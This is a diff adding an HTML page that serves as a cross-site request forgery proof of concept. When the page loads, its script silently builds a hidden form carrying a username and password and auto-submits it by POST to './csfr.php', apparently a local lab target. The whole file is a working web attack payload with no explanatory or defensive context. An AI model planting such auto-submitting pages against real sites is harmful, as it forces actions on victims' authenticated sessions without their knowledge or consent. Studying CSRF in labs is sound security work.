@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <script>
+        window.onload = function() {
+            var form = document.createElement('form');
+            form.action = './csfr.php'; 
+            form.method = 'POST';
+
+            var username = document.createElement('input');
+            username.type = 'hidden';
+            username.name = 'username';
+            username.value = 'host';
+            form.appendChild(username);
+
+            var password = document.createElement('input');
+            password.type = 'hidden';
+            password.name = 'password';
+            password.value = 'pass';
+            form.appendChild(password);
+
+            document.body.appendChild(form);
+            form.submit();
+        };
+    </script>
+</head>
+<body>
+</body>
+</html>
